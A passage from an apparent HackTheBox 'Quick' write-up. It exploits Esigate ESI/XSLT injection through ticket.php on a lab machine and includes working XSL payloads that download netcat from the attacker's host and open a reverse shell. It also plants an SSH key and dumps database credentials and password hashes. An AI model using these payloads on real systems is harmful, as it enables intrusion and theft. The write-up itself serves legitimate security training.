+</pre></table></code></div></div><p>The header <code class="language-plaintext highlighter-rouge">X-Powered-By: Esigate</code> is enough to understand that the web-app is powered by <code class="language-plaintext highlighter-rouge">Esigate</code>.</p><p>If we google about <strong>Esigate exploit</strong> we get a couple of information that esigate is vulnerable to <code class="language-plaintext highlighter-rouge">Xslt-Injection</code> that leads to <code class="language-plaintext highlighter-rouge">Remote-code-execution</code>.</p><p>Here is a Full <a href="https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/">Article</a> on this.</p><p>And in the current scenerio the vulnerbale page is <code class="language-plaintext highlighter-rouge">ticket.php</code> that will genertae tickets.</p><p>Lets intercept the request of <code class="language-plaintext highlighter-rouge">ticket.php</code> in the burp and send it to repeater for further trails and errors.</p><p>this is a test request</p><div class="language-http highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+</pre><td class="rouge-code"><pre><span class="nf">POST</span> <span class="nn">/ticket.php</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">quick.htb:9001</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">31</span>
+<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">max-age=0</span>
+<span class="na">Origin</span><span class="p">:</span> <span class="s">http://quick.htb:9001</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span>
+<span class="na">Referer</span><span class="p">:</span> <span class="s">http://quick.htb:9001/ticket.php</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.9,hi;q=0.8</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">PHPSESSID=ug0pmcjp7lb912pos55ohh0vk6</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+
+title=test&amp;msg=test&amp;id=TKT-3617
+</pre></table></code></div></div><p>Reponse was:</p><div class="language-http highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre><td class="rouge-code"><pre><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">Apache/2.4.29 (Ubuntu)</span>
+<span class="na">Expires</span><span class="p">:</span> <span class="s">Thu, 19 Nov 1981 08:52:00 GMT</span>
+<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">no-store, no-cache, must-revalidate</span>
+<span class="na">Pragma</span><span class="p">:</span> <span class="s">no-cache</span>
+<span class="na">Vary</span><span class="p">:</span> <span class="s">Accept-Encoding</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=UTF-8</span>
+<span class="na">Via</span><span class="p">:</span> <span class="s">1.1 localhost (Apache-HttpClient/4.5.2 (cache))</span>
+<span class="na">X-Powered-By</span><span class="p">:</span> <span class="s">Esigate</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">131</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+
+<span class="nt">&lt;script&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="dl">"</span><span class="s2">Ticket NO : </span><span class="se">\"</span><span class="s2">TKT-3617</span><span class="se">\"</span><span class="s2"> raised. We will answer you as soon as possible</span><span class="dl">"</span><span class="p">);</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="o">=</span><span class="dl">"</span><span class="s2">/home.php</span><span class="dl">"</span><span class="p">;</span><span class="nt">&lt;/script&gt;</span>
+</pre></table></code></div></div><p>And we can access the ticket with <code class="language-plaintext highlighter-rouge">http://quick.htb:9001/search.php?search=TKT-3617</code></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/quick/e59d2541-6f41-40b3-bbdb-21ff0c080d36/image-5.png" alt="Test-ticket" /></p><p>So here is what i am gonna do</p><p>According to the article we need a <code class="language-plaintext highlighter-rouge">.xml</code> file and a <code class="language-plaintext highlighter-rouge">.xsl</code> file the .xsl file will do all the work.</p><blockquote><p>Note —We cant use two or more ticket containg the same filename so everytime any failure happen you need to rename your .xml and .xsl file.</p></blockquote><p>I will create 6 files <strong>3 .xml</strong> files names a.xml , b.xml and c.xml and <strong>3 .xsl</strong> files a.xsl , b.xsl , c.xsl</p><p>The file <code class="language-plaintext highlighter-rouge">a.xsl</code> will execute the command to download netcat from my machine , the file <code class="language-plaintext highlighter-rouge">b.xsl</code> will contain the command to give it <code class="language-plaintext highlighter-rouge">+x</code> execute permission and the file <code class="language-plaintext highlighter-rouge">c.xsl</code> will contain the command to give me reverse connection back.</p><p>Every time i access the TKT-no. on <code class="language-plaintext highlighter-rouge">search.php</code> the file get <code class="language-plaintext highlighter-rouge">executed</code>.</p><p>My payload for the <code class="language-plaintext highlighter-rouge">ticket.php</code> will be</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>title=a&amp;msg=&lt;esi:include+src="http://10.10.X.X/a.xml"+stylesheet="http://10.10.X.X/a.xsl"&gt;
+&lt;/esi:include&gt;&amp;id=TKT-1111
+</pre></table></code></div></div><p>The content of every .xsl file –</p><blockquote><p>a.xsl</p></blockquote><div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+</pre><td class="rouge-code"><pre><span class="cp">&lt;?xml version="1.0" ?&gt;</span>
+<span class="nt">&lt;xsl:stylesheet</span> <span class="na">version=</span><span class="s">"1.0"</span> <span class="na">xmlns:xsl=</span><span class="s">"http://www.w3.org/1999/XSL/Transform"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;xsl:output</span> <span class="na">method=</span><span class="s">"xml"</span> <span class="na">omit-xml-declaration=</span><span class="s">"yes"</span><span class="nt">/&gt;</span>
+<span class="nt">&lt;xsl:template</span> <span class="na">match=</span><span class="s">"/"</span>
+<span class="na">xmlns:xsl=</span><span class="s">"http://www.w3.org/1999/XSL/Transform"</span>
+<span class="na">xmlns:rt=</span><span class="s">"http://xml.apache.org/xalan/java/java.lang.Runtime"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;root&gt;</span>
+<span class="nt">&lt;xsl:variable</span> <span class="na">name=</span><span class="s">"cmd"</span><span class="nt">&gt;</span><span class="cp">&lt;![CDATA[wget http://10.10.x.x/nc]]&gt;</span><span class="nt">&lt;/xsl:variable&gt;</span>
+<span class="nt">&lt;xsl:variable</span> <span class="na">name=</span><span class="s">"rtObj"</span> <span class="na">select=</span><span class="s">"rt:getRuntime()"</span><span class="nt">/&gt;</span>
+<span class="nt">&lt;xsl:variable</span> <span class="na">name=</span><span class="s">"process"</span> <span class="na">select=</span><span class="s">"rt:exec($rtObj, $cmd)"</span><span class="nt">/&gt;</span>
+Process: <span class="nt">&lt;xsl:value-of</span> <span class="na">select=</span><span class="s">"$process"</span><span class="nt">/&gt;</span>
+Command: <span class="nt">&lt;xsl:value-of</span> <span class="na">select=</span><span class="s">"$cmd"</span><span class="nt">/&gt;</span>
+<span class="nt">&lt;/root&gt;</span>
+<span class="nt">&lt;/xsl:template&gt;</span>
+<span class="nt">&lt;/xsl:stylesheet&gt;</span>
+</pre></table></code></div></div><blockquote><p>b.xsl</p></blockquote><div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+</pre><td class="rouge-code"><pre><span class="cp">&lt;?xml version="1.0" ?&gt;</span>
+<span class="nt">&lt;xsl:stylesheet</span> <span class="na">version=</span><span class="s">"1.0"</span> <span class="na">xmlns:xsl=</span><span class="s">"http://www.w3.org/1999/XSL/Transform"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;xsl:output</span> <span class="na">method=</span><span class="s">"xml"</span> <span class="na">omit-xml-declaration=</span><span class="s">"yes"</span><span class="nt">/&gt;</span>
+<span class="nt">&lt;xsl:template</span> <span class="na">match=</span><span class="s">"/"</span>
+<span class="na">xmlns:xsl=</span><span class="s">"http://www.w3.org/1999/XSL/Transform"</span>
+<span class="na">xmlns:rt=</span><span class="s">"http://xml.apache.org/xalan/java/java.lang.Runtime"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;root&gt;</span>
+<span class="nt">&lt;xsl:variable</span> <span class="na">name=</span><span class="s">"cmd"</span><span class="nt">&gt;</span><span class="cp">&lt;![CDATA[chmod +x nc]]&gt;</span><span class="nt">&lt;/xsl:variable&gt;</span>
+<span class="nt">&lt;xsl:variable</span> <span class="na">name=</span><span class="s">"rtObj"</span> <span class="na">select=</span><span class="s">"rt:getRuntime()"</span><span class="nt">/&gt;</span>
+<span class="nt">&lt;xsl:variable</span> <span class="na">name=</span><span class="s">"process"</span> <span class="na">select=</span><span class="s">"rt:exec($rtObj, $cmd)"</span><span class="nt">/&gt;</span>
+Process: <span class="nt">&lt;xsl:value-of</span> <span class="na">select=</span><span class="s">"$process"</span><span class="nt">/&gt;</span>
+Command: <span class="nt">&lt;xsl:value-of</span> <span class="na">select=</span><span class="s">"$cmd"</span><span class="nt">/&gt;</span>
+<span class="nt">&lt;/root&gt;</span>
+<span class="nt">&lt;/xsl:template&gt;</span>
+<span class="nt">&lt;/xsl:stylesheet&gt;</span>
+</pre></table></code></div></div><blockquote><p>c.xsl</p></blockquote><div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+</pre><td class="rouge-code"><pre><span class="cp">&lt;?xml version="1.0" ?&gt;</span>
+<span class="nt">&lt;xsl:stylesheet</span> <span class="na">version=</span><span class="s">"1.0"</span> <span class="na">xmlns:xsl=</span><span class="s">"http://www.w3.org/1999/XSL/Transform"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;xsl:output</span> <span class="na">method=</span><span class="s">"xml"</span> <span class="na">omit-xml-declaration=</span><span class="s">"yes"</span><span class="nt">/&gt;</span>
+<span class="nt">&lt;xsl:template</span> <span class="na">match=</span><span class="s">"/"</span>
+<span class="na">xmlns:xsl=</span><span class="s">"http://www.w3.org/1999/XSL/Transform"</span>
+<span class="na">xmlns:rt=</span><span class="s">"http://xml.apache.org/xalan/java/java.lang.Runtime"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;root&gt;</span>
+<span class="nt">&lt;xsl:variable</span> <span class="na">name=</span><span class="s">"cmd"</span><span class="nt">&gt;</span><span class="cp">&lt;![CDATA[./nc -e /bin/bash 10.10.x.x 4444]]&gt;</span><span class="nt">&lt;/xsl:variable&gt;</span>
+<span class="nt">&lt;xsl:variable</span> <span class="na">name=</span><span class="s">"rtObj"</span> <span class="na">select=</span><span class="s">"rt:getRuntime()"</span><span class="nt">/&gt;</span>
+<span class="nt">&lt;xsl:variable</span> <span class="na">name=</span><span class="s">"process"</span> <span class="na">select=</span><span class="s">"rt:exec($rtObj, $cmd)"</span><span class="nt">/&gt;</span>
+Process: <span class="nt">&lt;xsl:value-of</span> <span class="na">select=</span><span class="s">"$process"</span><span class="nt">/&gt;</span>
+Command: <span class="nt">&lt;xsl:value-of</span> <span class="na">select=</span><span class="s">"$cmd"</span><span class="nt">/&gt;</span>
+<span class="nt">&lt;/root&gt;</span>
+<span class="nt">&lt;/xsl:template&gt;</span>
+<span class="nt">&lt;/xsl:stylesheet&gt;</span>
+</pre></table></code></div></div><p>So i need to start my python server on port 80 in the dir where the all files are located.</p><p>And execute the <code class="language-plaintext highlighter-rouge">TKT</code> After i submit the request.</p><p>Lets get started.</p><blockquote><p>1st Request</p></blockquote><div class="language-http highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+</pre><td class="rouge-code"><pre><span class="nf">POST</span> <span class="nn">/ticket.php</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">quick.htb:9001</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">120</span>
+<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">max-age=0</span>
+<span class="na">Origin</span><span class="p">:</span> <span class="s">http://quick.htb:9001</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span>
+<span class="na">Referer</span><span class="p">:</span> <span class="s">http://quick.htb:9001/ticket.php</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.9,hi;q=0.8</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">PHPSESSID=ug0pmcjp7lb912pos55ohh0vk6</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+
+title=a&amp;msg=&lt;esi:include+src="http://10.10.x.x/a.xml"+stylesheet="http://10.10.x.x/a.xsl"&gt;&lt;/esi:include&gt;&amp;id=TKT-1111
+</pre></table></code></div></div><p>Response –</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/quick/e59d2541-6f41-40b3-bbdb-21ff0c080d36/image-7.png" alt="Test-ticket" /></p><p>And i executed the <code class="language-plaintext highlighter-rouge">TKT</code> on my broswer by visiting <code class="language-plaintext highlighter-rouge">http://quick.htb:9001/search.php?search=TKT-1111</code></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/quick/e59d2541-6f41-40b3-bbdb-21ff0c080d36/image-8.png" alt="Test-ticket" /></p><p>And my python-server got hitted</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre>➜  quick python <span class="nt">-m</span> http.server 80
+Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
+10.10.10.186 - - <span class="o">[</span>30/Apr/2020 18:54:36] <span class="s2">"GET /a.xsl HTTP/1.1"</span> 200 -
+10.10.10.186 - - <span class="o">[</span>30/Apr/2020 18:54:37] <span class="s2">"GET /a.xml HTTP/1.1"</span> 200 -
+10.10.10.186 - - <span class="o">[</span>30/Apr/2020 18:54:37] <span class="s2">"GET /nc HTTP/1.1"</span> 200 -
+</pre></table></code></div></div><p>I just chnaged the filenames and <code class="language-plaintext highlighter-rouge">TKT</code> number in the next request</p><blockquote><p>2nd Request</p></blockquote><div class="language-http highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+</pre><td class="rouge-code"><pre><span class="nf">POST</span> <span class="nn">/ticket.php</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">quick.htb:9001</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">120</span>
+<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">max-age=0</span>
+<span class="na">Origin</span><span class="p">:</span> <span class="s">http://quick.htb:9001</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span>
+<span class="na">Referer</span><span class="p">:</span> <span class="s">http://quick.htb:9001/ticket.php</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.9,hi;q=0.8</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">PHPSESSID=ug0pmcjp7lb912pos55ohh0vk6</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+
+title=a&amp;msg=&lt;esi:include+src="http://10.10.x.x/b.xml"+stylesheet="http://10.10.x.x/b.xsl"&gt;&lt;/esi:include&gt;&amp;id=TKT-2222
+</pre></table></code></div></div><p>Doing the same process my python server again got hitted.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>10.10.10.186 - - <span class="o">[</span>30/Apr/2020 18:58:20] <span class="s2">"GET /b.xsl HTTP/1.1"</span> 200 -
+10.10.10.186 - - <span class="o">[</span>30/Apr/2020 18:58:21] <span class="s2">"GET /b.xml HTTP/1.1"</span> 200 -
+</pre></table></code></div></div><p>And now its third and last request</p><blockquote><p>3rd request</p></blockquote><div class="language-http highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+</pre><td class="rouge-code"><pre><span class="nf">POST</span> <span class="nn">/ticket.php</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">quick.htb:9001</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">120</span>
+<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">max-age=0</span>
+<span class="na">Origin</span><span class="p">:</span> <span class="s">http://quick.htb:9001</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span>
+<span class="na">Referer</span><span class="p">:</span> <span class="s">http://quick.htb:9001/ticket.php</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.9,hi;q=0.8</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">PHPSESSID=ug0pmcjp7lb912pos55ohh0vk6</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+
+title=a&amp;msg=&lt;esi:include+src="http://10.10.x.x/c.xml"+stylesheet="http://10.10.x.x/c.xsl"&gt;&lt;/esi:include&gt;&amp;id=TKT-3333
+</pre></table></code></div></div><h1 id="got-shell-as-sam">Got shell as sam</h1><p>Executing the ticket i got c.xsl to be hitted and on the other hand on my listener i got rev connection on my <code class="language-plaintext highlighter-rouge">netcat</code> <strong>listener</strong>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre><td class="rouge-code"><pre>➜  prashant nc <span class="nt">-nlvp</span> 4444
+Ncat: Version 7.80 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 10.10.10.186.
+Ncat: Connection from 10.10.10.186:36834.
+<span class="nb">whoami
+</span>sam
+</pre></table></code></div></div><p>And we got shell as <code class="language-plaintext highlighter-rouge">sam</code>.</p><h1 id="got-usertxt">Got user.txt</h1><p>I upgraded my shell to <code class="language-plaintext highlighter-rouge">ssh</code> for good communication with machine.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre><span class="nb">echo</span> <span class="s2">"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDh/ub/0EON2VMcbDR9d9SnqU8cGsad08Ecr/Wbd2cfB+/08vCs6HIjdz2bSz+96QKODz6qP2irEOn8uAPIalCq0oB028LL4H/hZBQag8/UluQRrc2sfdImt5wm/cAN/KNPORWfVYxMOlBsIf5UTs7lMCoi43FRCpuZhGcu8CmWvHPJ1PMd/z0Cpnibq330u7vxBzm5mvm/5HWNst5BZ5NNTIEjWtoz4jj0fyFLyzVfJS4q7AQ9q4L4MndxEcG2rfnQyrko50NqwWiUpM7WpyT9QfyuEV5cYmgdbYugt2sdvOeJRqeIw/qyRFQs4XxJnz6Cxolm9ju4llNb2/ug6fsdK/cZauxSYh7Ddu06sTZoKexeMKVj/saHah76uwkdvT+sTXVYv9uwOdTC8KcwlmdmMAg3NUXWltaMNjryqon+g/81Ky2ugCCpG+jJB5SJxupwLJ1hhhujP5RCLk3Ebo9pL0twJhBdbxPLjMunEgMUKPN4u59gNMxOetAYYpcb9Bc= prashant@parrot
+"</span> <span class="o">&gt;&gt;</span> authorized_keys<span class="sb">```</span>
+
+<span class="sb">```</span>bash
+sam@quick:~<span class="nv">$ </span><span class="nb">cat </span>user.txt
+8cbd---------------------b82c
+sam@quick:~<span class="err">$</span>
+</pre></table></code></div></div><h1 id="privilege-escalation-to-srvadm">Privilege escalation to srvadm</h1><p>After some manual enumeration i got a file called <code class="language-plaintext highlighter-rouge">db.php</code> which contains database information this was the file which we got on port 9001 .now we have a proper shell so we can read the php code .</p><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre><span class="nx">sam</span><span class="o">@</span><span class="nx">quick</span><span class="o">:/</span><span class="k">var</span><span class="o">/</span><span class="nx">www</span><span class="o">/</span><span class="nx">html</span><span class="err">$</span> <span class="nx">cat</span> <span class="nx">db</span><span class="o">.</span><span class="nx">php</span> 
+<span class="o">&lt;?</span><span class="nx">php</span>
+<span class="nv">$conn</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">mysqli</span><span class="p">(</span><span class="s2">"localhost"</span><span class="p">,</span><span class="s2">"db_adm"</span><span class="p">,</span><span class="s2">"db_p4ss"</span><span class="p">,</span><span class="s2">"quick"</span><span class="p">);</span>
+<span class="cp">?&gt;</span>
+</pre></table></code></div></div><p>Lets connect to mysql <code class="language-plaintext highlighter-rouge">mysql -h localhost -u db_adm -p</code></p><h2 id="dumping-the-mysql-databse">Dumping the mysql databse</h2><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+</pre><td class="rouge-code"><pre>sam@quick:/var/www/html<span class="nv">$ </span>mysql <span class="nt">-h</span> localhost <span class="nt">-u</span> db_adm <span class="nt">-p</span> 
+Enter password: 
+Welcome to the MySQL monitor.  Commands end with <span class="p">;</span> or <span class="se">\g</span><span class="nb">.</span>
+Your MySQL connection <span class="nb">id </span>is 366
+Server version: 5.7.29-0ubuntu0.18.04.1 <span class="o">(</span>Ubuntu<span class="o">)</span>
+
+Copyright <span class="o">(</span>c<span class="o">)</span> 2000, 2020, Oracle and/or its affiliates. All rights reserved.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type <span class="s1">'help;'</span> or <span class="s1">'\h'</span> <span class="k">for </span>help. Type <span class="s1">'\c'</span> to clear the current input statement.
+
+mysql&gt; 
+</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>show DATABASES<span class="p">;</span>
+</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre><td class="rouge-code"><pre>mysql&gt; show DATABASES<span class="p">;</span>
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mysql              |
+| performance_schema |
+| quick              |
+| sys                |
++--------------------+
+5 rows <span class="k">in </span><span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>
+
+mysql&gt; 
+</pre></table></code></div></div><p>There is a <code class="language-plaintext highlighter-rouge">quick</code> named <code class="language-plaintext highlighter-rouge">database</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre>mysql&gt; use quick<span class="p">;</span>
+Reading table information <span class="k">for </span>completion of table and column names
+You can turn off this feature to get a quicker startup with <span class="nt">-A</span>
+
+Database changed
+mysql&gt; 
+</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre><td class="rouge-code"><pre>mysql&gt; show tables<span class="p">;</span>
++-----------------+
+| Tables_in_quick |
++-----------------+
+| <span class="nb">jobs</span>            |
+| tickets         |
+| <span class="nb">users</span>           |
++-----------------+
+3 rows <span class="k">in </span><span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>
+
+mysql&gt; 
+</pre></table></code></div></div><p>It has three tables , <code class="language-plaintext highlighter-rouge">users</code> is interesting</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre><td class="rouge-code"><pre>mysql&gt; <span class="k">select</span> <span class="k">*</span> from <span class="nb">users</span><span class="p">;</span>
++--------------+------------------+----------------------------------+
+| name         | email            | password                         |
++--------------+------------------+----------------------------------+
+| Elisa        | elisa@wink.co.uk | c6c35ae1f3cb19438e0199cfa72a9d9d |
+| Server Admin | srvadm@quick.htb | 0c0ba48811bed85e3093bc71c6037891 |
++--------------+------------------+----------------------------------+
+2 rows <span class="k">in </span><span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>
+
+mysql&gt; 
+</pre></table></code></div></div><p>We got a password hash of <code class="language-plaintext highlighter-rouge">srvadm</code> its a <code class="language-plaintext highlighter-rouge">md5</code> hash.</p><p>I tried to crack the hash with john , hash-cat , online crack stations. But failed dont know why !</p><p>Then i just started enumerating the internal files.</p><h2 id="cracking-the-md5-hash">Cracking the md5-hash</h2><p>And i got a <code class="language-plaintext highlighter-rouge">index.php</code> file in dir <code class="language-plaintext highlighter-rouge">/var/www/printers</code></p><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
+<span class="k">include</span><span class="p">(</span><span class="s2">"db.php"</span><span class="p">);</span>
+<span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">"email"</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">"password"</span><span class="p">]))</span>
+<span class="p">{</span>
